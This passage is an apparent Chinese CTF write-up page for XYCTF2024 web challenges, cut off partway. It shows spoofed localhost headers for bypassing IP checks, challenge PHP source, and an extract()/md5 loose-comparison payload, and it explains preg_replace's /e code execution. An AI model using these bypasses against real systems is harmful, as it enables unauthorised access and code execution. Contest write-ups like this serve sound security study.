@@ -1,0 +1,2462 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 多做点题。总觉得自己做题做不出来，还是要多写一点。 ezhttp 知识点：http、robots.txt 源代码里提示密码放在了某个地方，直觉是robo">
+<title>XYCTF2024</title>
+
+<link rel='canonical' href='http://localhost:1313/p/xyctf2024/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="XYCTF2024">
+<meta property='og:description' content="前言 多做点题。总觉得自己做题做不出来，还是要多写一点。 ezhttp 知识点：http、robots.txt 源代码里提示密码放在了某个地方，直觉是robo">
+<meta property='og:url' content='http://localhost:1313/p/xyctf2024/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-29T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="XYCTF2024">
+<meta name="twitter:description" content="前言 多做点题。总觉得自己做题做不出来，还是要多写一点。 ezhttp 知识点：http、robots.txt 源代码里提示密码放在了某个地方，直觉是robo">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#ezhttp">ezhttp</a>
+      <ol>
+        <li><a href="#知识点httprobotstxt">知识点：http、robots.txt</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezmd5">ezmd5</a>
+      <ol>
+        <li><a href="#知识点md5碰撞">知识点：md5碰撞</a></li>
+      </ol>
+    </li>
+    <li><a href="#warm-up">Warm up</a>
+      <ol>
+        <li><a href="#知识点md5绕过">知识点：md5绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezclass">ezClass</a>
+      <ol>
+        <li><a href="#知识点php原生类errorgemessagespl原生类伪协议利用">知识点：php原生类Error：geMessage()、Spl原生类+伪协议利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezrce">ezRce</a>
+      <ol>
+        <li><a href="#知识点无字母rce八进制0">知识点：无字母rce（八进制+$0&laquo;&lt;）</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezlfi">ezLFI</a>
+      <ol>
+        <li><a href="#知识点利用filter过滤器的编码组合构造rce">知识点：利用filter过滤器的编码组合构造RCE</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezpop">ezPop</a>
+      <ol>
+        <li><a href="#知识点gc垃圾回收call_user_funcabcd">知识点：GC垃圾回收、call_user_func($a,$b)($c)($d)</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezserialize">ezSerialize</a>
+      <ol>
+        <li><a href="#知识点反序列化知识点杂糅">知识点：反序列化知识点杂糅</a></li>
+      </ol>
+    </li>
+    <li><a href="#牢牢记住逝者为大">牢牢记住，逝者为大</a>
+      <ol>
+        <li><a href="#知识点wage远程下载木马nc反弹shell">知识点：wage远程下载木马、nc反弹shell</a></li>
+      </ol>
+    </li>
+    <li><a href="#连连看httpssocsdnnetsosearchq连连看spm1001210130017020到底是连连什么看"><a href="https://so.csdn.net/so/search?q=%E8%BF%9E%E8%BF%9E%E7%9C%8B&amp;spm=1001.2101.3001.7020">连连看</a>到底是连连什么看</a>
+      <ol>
+        <li><a href="#知识点php_filter_chainstringstrip_tags过滤php">知识点：php_filter_chain、string.strip_tags过滤php</a></li>
+      </ol>
+    </li>
+    <li><a href="#我是一个复读机">我是一个复读机</a>
+      <ol>
+        <li><a href="#知识点脑洞sstirequestattr绕过">知识点：脑洞ssti、request+attr绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#login">login</a>
+      <ol>
+        <li><a href="#知识点pickle反序列化o指令码绕过">知识点：pickle反序列化o指令码绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#give-me-flag">give me flag</a>
+      <ol>
+        <li><a href="#知识点哈希长度拓展攻击">知识点：哈希长度拓展攻击</a></li>
+      </ol>
+    </li>
+    <li><a href="#pharme">pharme</a>
+      <ol>
+        <li><a href="#知识点__halt_compiler终止编译evalendgetallheaders绕过无参数rcephar反序列化phpfilter绕过phar">知识点：__halt_compiler()终止编译、eval(end(getallheaders()));绕过无参数rce、phar反序列化、php:filter绕过phar</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezmake">ezMake</a>
+      <ol>
+        <li><a href="#知识点makefile">知识点：Makefile</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezmake-1">ez?Make</a>
+      <ol>
+        <li><a href="#知识点反弹shell">知识点：反弹shell</a></li>
+      </ol>
+    </li>
+    <li><a href="#εzмkε">εZ?¿м@Kε¿?</a>
+      <ol>
+        <li><a href="#知识点无字母数字makefile">知识点：无字母数字makefile</a></li>
+      </ol>
+    </li>
+    <li><a href="#baby_unserialize">baby_unserialize</a></li>
+    <li><a href="#小结">小结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" >
+                Wp
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/xyctf2024/">XYCTF2024</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-07-29</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 15 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>多做点题。总觉得自己做题做不出来，还是要多写一点。</p>
+<h2 id="ezhttp">ezhttp
+</h2><h3 id="知识点httprobotstxt">知识点：http、robots.txt
+</h3><p>源代码里提示密码放在了某个地方，直觉是robots.txt。然后可以进/l0g1n.txt看到账号和密码</p>
+<p><img src="/p/xyctf2024/image-20250729132957432.png"
+	width="545"
+	height="172"
+	srcset="/p/xyctf2024/image-20250729132957432_hu3132556971175434162.png 480w, /p/xyctf2024/image-20250729132957432_hu12915832062395713467.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729132957432"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="760px"
+	
+></p>
+<p>然后是http的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">记录一下本地访问
+</span></span><span class="line"><span class="cl">Client-IP: 127.0.0.1
+</span></span><span class="line"><span class="cl">Forwarded-For: 127.0.0.1
+</span></span><span class="line"><span class="cl">Forwarded: 127.0.0.1
+</span></span><span class="line"><span class="cl">Forwarded-For: localhost
+</span></span><span class="line"><span class="cl">X-Forwarded-For-Original:127.0.0.1
+</span></span><span class="line"><span class="cl">X-Forwarded-For-Original: localhost
+</span></span><span class="line"><span class="cl">X-Forwarded-For: 127.0.0.1
+</span></span><span class="line"><span class="cl">X-Forwarded-For: localhost
+</span></span><span class="line"><span class="cl">X-Forwarded-Server: 127.0.0.1
+</span></span><span class="line"><span class="cl">X-Forwarded-Server: localhost
+</span></span><span class="line"><span class="cl">X-Forwarded: 127.0.0.1
+</span></span><span class="line"><span class="cl">X-Host:127.0.0.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250729134355455.png"
+	width="1735"
+	height="842"
+	srcset="/p/xyctf2024/image-20250729134355455_hu5124518257539829828.png 480w, /p/xyctf2024/image-20250729134355455_hu9664602785374009103.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729134355455"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="494px"
+	
+></p>
+<h2 id="ezmd5">ezmd5
+</h2><h3 id="知识点md5碰撞">知识点：md5碰撞
+</h3><p>碰撞两张图片</p>
+<p>本来应该用工具碰撞一下的，结果直接搜到了两张图片的md5值相同</p>
+<p>原文链接：<a class="link" href="https://zhangshuqiao.org/2018-02/%E5%88%B6%E9%80%A0MD5%E7%A2%B0%E6%92%9E/"  target="_blank" rel="noopener"
+    >制造 MD5 碰撞</a></p>
+<p><img src="/p/xyctf2024/image-20250729135646855.png"
+	width="2140"
+	height="215"
+	srcset="/p/xyctf2024/image-20250729135646855_hu3625956026240780758.png 480w, /p/xyctf2024/image-20250729135646855_hu17702605237718190431.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729135646855"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="995"
+		data-flex-basis="2388px"
+	
+></p>
+<p>真要碰撞的话用<a class="link" href="https://github.com/zhijieshi/md5collgen"  target="_blank" rel="noopener"
+    >MD5COLLGEN</a>碰撞图片就行</p>
+<h2 id="warm-up">Warm up
+</h2><h3 id="知识点md5绕过">知识点：md5绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;next.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$XYCTF</span> <span class="o">=</span> <span class="s2">&#34;Warm up&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val1&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;val2&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;ez&#34;</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;什么情况,这么基础的md5做不来&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$md5</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$md5</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;ezez&#34;</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;什么情况,这么基础的md5做不来&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$XY</span> <span class="o">==</span> <span class="nv">$XYCTF</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$XY</span> <span class="o">!=</span> <span class="s2">&#34;XYCTF_550102591&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$XY</span><span class="p">)</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;XYCTF_550102591&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$level2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;什么情况,这么基础的md5做不来&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;学这么久,传参不会传?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面newstar做了差不多的题目，唯一需要注意的是<code>extract($_GET);</code>，它可以覆盖变量绕过<code>$XY == $XYCTF</code></p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250729141514677.png"
+	width="1261"
+	height="622"
+	srcset="/p/xyctf2024/image-20250729141514677_hu14710678652977205033.png 480w, /p/xyctf2024/image-20250729141514677_hu4423598222716594661.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729141514677"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;操作你O.o&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>  <span class="c1">// 我可不会像别人一样设置10来个level
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有点汗流浃背&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一层用数组绕过</p>
+<p>第二层解释一下<code>preg_replace</code> 函数</p>
+<p>它有一个非常危险的修饰符：<code>/e</code>。当使用这个修饰符时，它会将替换字符串（第二个参数）当作PHP代码来执行。</p>
+<p>第一个参数<code>/.*/e</code>可以匹配任意字符串</p>
+<p>第二个参数是命令</p>
+<p>第三个参数随便填，因为上面的模式是/.*/，可以匹配任意字符串</p>
+<p><img src="/p/xyctf2024/image-20250729142935979.png"
+	width="1127"
+	height="774"
+	srcset="/p/xyctf2024/image-20250729142935979_hu10567674982201476618.png 480w, /p/xyctf2024/image-20250729142935979_hu17799874520464777693.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729142935979"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="349px"
+	
+></p>
+<h2 id="ezclass">ezClass
+</h2><h3 id="知识点php原生类errorgemessagespl原生类伪协议利用">知识点：php原生类Error：geMessage()、Spl原生类+伪协议利用
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
